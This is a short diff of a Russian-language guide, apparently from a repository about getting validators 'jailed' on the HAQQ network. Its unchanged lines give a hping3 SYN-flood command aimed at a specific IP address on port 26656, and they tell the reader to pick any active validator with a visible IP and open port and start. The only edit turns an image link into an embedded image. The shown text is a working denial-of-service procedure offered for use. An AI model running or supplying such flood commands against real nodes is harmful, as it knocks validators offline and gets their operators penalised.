@@ -8,4 +8,4 @@
 Команда запуска: **`hping3 -S -p 26656 -i u10 -d 1024 --flood 185.182.186.35`**<br/>
 Выбираем активного валидатора,у которого виден IP адрес и открыт порт 26656  и можно начинать.<br/>
 **Смотрим, что Валидатор работает и активен**<br/>
-[pic1](https://github.com/Takhminaqa/To-Jail-Validator-in-HAQQ-Network/blob/main/asset/1pic.png)<br/>
+![pic1](https://github.com/Takhminaqa/To-Jail-Validator-in-HAQQ-Network/blob/main/asset/1pic.png)
